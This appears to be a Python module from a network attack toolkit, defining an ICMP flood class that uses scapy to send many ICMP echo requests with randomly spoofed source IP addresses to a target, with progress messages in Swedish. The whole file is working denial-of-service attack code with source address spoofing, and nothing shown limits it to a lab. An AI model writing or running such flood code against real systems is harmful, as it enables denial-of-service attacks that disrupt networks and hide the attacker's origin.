"""
ICMP Flood Attack
"""
from scapy.all import IP, ICMP, Raw
import time
from .base_attack import BaseAttack
from utils.network_utils import generate_random_ip


class ICMPAttack(BaseAttack):
    """ICMP Echo Request Flood"""

    def get_attack_name(self):
        return "ICMP Flood"

    def execute(self, count=100):
        """Kör ICMP flood attack"""
        self.print_header("ICMP Flood Attack", count=count)

        self.start_time = time.time()
        self.packets_sent = 0

        for i in range(count):
            fake_source = generate_random_ip()
            payload = f"{self.custom_message}_ICMP_PKT_{i+1}".encode()

            packet = IP(src=fake_source, dst=self.target_ip)/ICMP()/Raw(load=payload)
            self.send_packet(packet)

            if (i + 1) % 50 == 0:
                elapsed = time.time() - self.start_time
                pps = self.packets_sent / elapsed if elapsed > 0 else 0
                print(f"[+] ICMP: {i + 1}/{count} paket skickade ({pps:.1f} pps)")

        self.log_attack("ICMP_FLOOD", f"{count} packets sent with message: {self.custom_message}")
        self.print_summary()
